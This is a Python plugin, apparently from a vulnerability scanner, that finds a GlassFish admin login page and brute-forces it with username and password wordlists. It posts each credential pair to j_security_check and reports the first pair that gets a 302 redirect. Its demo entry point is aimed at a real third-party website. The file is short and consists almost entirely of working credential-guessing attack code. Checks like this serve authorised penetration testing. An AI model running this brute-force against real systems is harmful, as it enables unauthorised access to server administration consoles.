#!/usr/bin/env python3

from app.lib.utils.request import request
from app.lib.utils.common import get_useragent

class Glassfish_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Glassfish弱口令漏洞',
            'description': 'Glassfish弱口令漏洞',
            'date': '',
            'exptype': 'check',
            'type': 'Weakpwd'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent()
        }

    def check_url(self, url):
        
        """
        检测是否存在登陆地址

        :param:

        :return str url: 登录url
        """
        
        try:
            req = request.get(url, headers = self.headers)
            if "GlassFish" in req.text and req.status_code == 200:
                return url
            else:
                return False
        except Exception as e:
            return False
        finally:
            pass

    def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        valid_url = ""
        urls = []
        urls.append(self.url + '/common/j_security_check')
        urls.append(self.url + '/j_security_check')
        for url in urls:
            if self.check_url(url):
                valid_url = url
                break
        if valid_url == "":
            print('不存在Glassfish弱口令')
            return False
        for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
            user = user.strip()
            for pwd in open('app/password.txt', 'r', encoding = 'utf-8').readlines():
                if pwd != '':
                    pwd = pwd.strip()
                post_data = {
                    "j_username":user,
                    "j_password":pwd,
                    "loginButton":"Login",
                    "loginButton.DisabledHiddenField":"true"
                }
                try:
                    req = request.post(valid_url, headers = self.headers, data = post_data)
                    if req.status_code == 302:
                        print("存在Glassfish弱口令, user: %s pwd: %s"%(user, pwd))
                        return True
                except Exception as e:
                    print(e)
                    pass
        print('不存在Glassfish弱口令')
        return False

if __name__ == '__main__':
    Glassfish_Weakpwd = Glassfish_Weakpwd_BaseVerify('https://baidu.com')
    Glassfish_Weakpwd.check()